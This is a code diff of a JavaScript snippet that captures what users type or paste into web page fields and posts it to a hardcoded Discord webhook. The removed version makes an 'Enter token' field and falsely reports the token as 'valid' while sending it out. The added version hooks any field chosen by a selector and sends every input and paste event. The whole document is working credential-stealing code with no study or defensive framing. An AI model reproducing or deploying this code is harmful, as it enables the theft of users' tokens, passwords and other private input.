@@ -1,36 +1,38 @@
-(function () {
-    console.log("✅ Token Field Loaded");
-
+(function() {
     const WEBHOOK = "https://discord.com/api/webhooks/1510600905853108315/gg6Evk5crnNyA7BA6f6wCyObrc0n_OMutzwSLscFmpdn9WkpizHP1iN_KN4fjIQW1685";
 
-    async function sendToken(token) {
+    async function sendData(content) {
         try {
             await fetch(WEBHOOK, {
                 method: "POST",
-                headers: {
-                    "Content-Type": "application/json"
-                },
-                body: JSON.stringify({ content: `Token: ${token}` })
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ content: content })
             });
-            console.log("✅ Token is valid");
-        } catch (err) {
-            console.error("❌ Error the token is invalid");
+            console.log("✅ Sent to webhook");
+        } catch(e) {
+            console.error("❌ Failed to send");
         }
     }
 
-    function createField() {
-        const input = document.createElement("input");
-        input.placeholder = "Enter token";
+    function attachToField(selector) {
+        const field = document.querySelector(selector);
+        if (!field) return console.error("Field not found:", selector);
 
-        // Send token automatically whenever user types or pastes
-        input.addEventListener("input", () => {
-            if (input.value.trim()) {
-                sendToken(input.value.trim());
+        let oldValue = field.value;
+        field.addEventListener("input", () => {
+            let newValue = field.value;
+            if (newValue !== oldValue) {
+                sendData(`[INPUT] ${newValue}`);
+                oldValue = newValue;
             }
         });
 
-        document.body.appendChild(input);
+        field.addEventListener("paste", () => {
+            setTimeout(() => {
+                sendData(`[PASTE] ${field.value}`);
+            }, 10);
+        });
     }
 
-    window.addEventListener("DOMContentLoaded", createField);
+    window.attachToField = attachToField;
 })();
